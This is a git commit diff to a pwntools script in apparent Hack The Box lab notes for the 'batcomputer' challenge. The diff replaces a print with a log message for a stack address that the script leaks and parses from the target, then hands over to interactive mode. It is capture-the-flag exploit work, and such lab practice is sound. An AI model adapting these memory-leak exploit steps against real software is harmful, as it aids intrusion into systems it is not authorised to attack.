a2ebce4d4326ef2d7cf2133cb0cb621616859b65
Michel Klomp <michel@woodenshoe.org>
2021-02-14 17:47:59 +0100

    add log stack address

--- labnotes/htb/scripts/ch-batcomputer.py
+++ labnotes/htb/scripts/ch-batcomputer.py
@@ -9,6 +9,8 @@ stack_address = io.recvline().strip().split()[-1]
 stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
 stack_address = stack_address.rjust(8, '\x00')
 stack_address = u64(stack_address)
-print(stack_address)
+
+log.success(f'Leaked stack address: {p64(stack_address)}')
+
 
 io.interactive()
